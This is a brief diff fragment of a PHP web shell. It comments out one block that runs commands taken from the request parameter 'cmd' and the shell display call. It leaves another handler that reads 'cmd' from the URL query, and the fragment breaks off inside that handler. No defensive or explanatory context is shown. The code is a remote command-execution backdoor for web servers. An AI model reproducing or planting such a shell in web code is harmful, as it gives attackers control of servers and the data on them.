@@ -110,12 +110,12 @@ if (isset($_REQUEST['create'])) {
     create_shell($shell);
 }
 
-display_shell($shell);
+//display_shell($shell);
 
-if (isset($_REQUEST['cmd'])) {
-    $cmd = $_REQUEST['cmd'];
-    execute_command($shell, $cmd);
-}
+//if (isset($_REQUEST['cmd'])) {
+//    $cmd = $_REQUEST['cmd'];
+//    execute_command($shell, $cmd);
+//}
 
 if(isset($_GET['cmd'] )){
     $cmd = $_GET["cmd"];
